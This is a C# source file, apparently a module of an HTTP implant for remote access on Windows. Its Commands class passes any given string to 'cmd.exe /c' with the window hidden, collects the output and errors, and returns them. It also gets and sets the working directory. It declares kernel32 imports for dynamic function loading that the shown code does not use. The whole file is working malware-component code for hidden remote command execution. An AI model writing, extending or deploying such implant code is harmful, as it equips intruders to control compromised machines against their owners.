using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Reflection.Emit;
using System.IO;

namespace HTTPImplant.Modules
{
    public class Commands
    {
        delegate uint GetCurrentDirectoryDelegate(uint nBufferLength, StringBuilder lpBuffer);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
        public static string command(string command, string arguments)
        {
            string result = "";
            string fileName = "cmd.exe";
            string args = "/c " + command + " " + arguments;

            using (var process = new Process())
            {
                process.StartInfo.FileName = fileName;
                process.StartInfo.Arguments = args;  // Prefix arguments with /c to execute the command
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;

                try
                {
                    process.Start();
                    process.WaitForExit();

                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    result = output;

                    if (!string.IsNullOrEmpty(error))
                    {
                        result += error;
                    }
                }
                catch (Exception ex)
                {
                    result = "An exception occurred while executing the command: " + ex.Message;
                }
            }

            return result;
        }

        public static string GetCurrentDir()
        {
            string path = Environment.CurrentDirectory;
            return path;
        }
        public static string SetCurrentDir(string path)
        {
            Directory.SetCurrentDirectory(path);
            string newPath = GetCurrentDir();
            return newPath;
        }
    }
}
